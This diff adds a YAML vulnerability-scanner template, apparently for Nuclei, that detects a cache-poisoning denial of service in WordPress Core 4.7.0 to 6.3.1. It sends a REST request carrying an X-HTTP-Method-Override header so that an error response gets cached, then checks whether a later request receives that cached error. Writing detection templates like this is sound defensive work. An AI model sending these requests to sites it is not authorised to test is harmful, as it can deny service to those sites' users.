@@ -1,0 +1,58 @@
+id: wordpress-rest-dosviacp
+
+info:
+  name: WordPress Core 4.7.0-6.3.1 - Denial of Service via Cache Poisoning
+  author: Jupiter
+  severity: medium
+  description: |
+    WordPress Core is vulnerable to Denial of Service via Cache Poisoning in versions between 4.7.0 and 6.3.1. In cases where the X-HTTP-Method-Override header was sent in a request to a REST endpoint and the endpoint returned a 4xx error, the error could be cached, resulting in a denial of service.
+  reference:
+    - https://www.wordfence.com/blog/2023/10/wordpress-6-3-2-security-release-what-you-need-to-know/
+  tags: wordpress,wp,cache-poisoning
+
+variables:
+  string: "{{to_lower(rand_base(5))}}"
+
+http:
+  - raw:
+      - |
+        GET /wp-json/wp/v2/?cb={{string}} HTTP/2
+        Host: {{Hostname}}
+
+      - |
+        GET /wp-json/wp/v2/?cb={{string}} HTTP/2
+        Host: {{Hostname}}
+        X-HTTP-Method-Override: POST
+
+      - |
+        GET /wp-json/wp/v2/?cb={{string}} HTTP/2
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 != 400 && status_code_1 != 403 && status_code_1 !=  401 && status_code_1 != 405"
+
+      - type: word
+        part: header
+        words:
+          - 'Link: <'
+
+      - type: regex
+        part: header
+        regex:
+          - \bmax-age=\d{2,6}\b
+
+      - type: dsl
+        dsl:
+          - 'status_code_3 == 400'
+          - 'status_code_3 == 403'
+          - 'status_code_3 == 401'
+          - 'status_code_3 == 405'
+
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - '\bHIT\b'
